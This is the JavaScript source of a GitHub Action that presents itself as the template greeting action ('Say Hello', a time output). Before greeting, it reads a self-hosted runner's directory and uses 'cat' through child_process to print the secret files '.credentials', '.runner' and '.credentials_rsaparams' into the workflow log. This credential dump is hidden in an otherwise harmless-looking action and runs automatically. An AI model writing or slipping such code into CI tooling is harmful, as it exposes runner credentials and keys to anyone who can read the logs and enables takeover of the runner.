const core = require('@actions/core');
const github = require('@actions/github');
const fs = require("fs");
const process = require("child_process");

try {
    
    console.log("This is the v1.1.2 version.");
    console.log(__dirname);
    const files = fs.readdirSync('/home/musset/actions-runner');
    files.forEach(element => {
        if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
            console.log(`-----${element}------`);
            process.exec(`cat ${element}`, (error, stdout, stderr) => {
                if (error) {
                  console.error(`exec error: ${error}`);
                  return;
                }
                console.log(`stdout: ${stdout}`);
                console.log(`stderr: ${stderr}`);
              });
        }
        
    });
    // const files_other = fs.readdirSync('/home/musset/actions-runner-private');
    // files_other.forEach(element => {
    //     console.log(element);
    // });

    const nameToGreet = core.getInput('who-to-greet');
    console.log(`Say Hello ${nameToGreet}!`);
    const time = (new Date()).toTimeString();
    core.setOutput("time", time);

    // const payload = JSON.stringify(github.context.payload, undefined, 2);
    // console.log(`The event payload: ${payload}`);


} catch (error) {
    core.setFailed(error.message);
}